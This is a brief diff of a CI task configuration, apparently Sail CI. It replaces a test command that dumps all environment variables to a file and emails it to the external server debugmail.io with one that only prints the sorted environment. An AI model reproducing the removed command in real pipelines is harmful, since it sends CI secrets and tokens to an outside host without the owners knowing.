@@ -1,5 +1,5 @@
 tasks:
   test:
-    image: node:carbon
-    command:
-      - npm install -g nodemailer-cli && env > env.txt && nodemailer test@test.com test@test.com -j "Sail env" --server debugmail.io -r 25 --nossl --attachment env.txt
+    image: sailci/run
+    args:
+      - env | sort
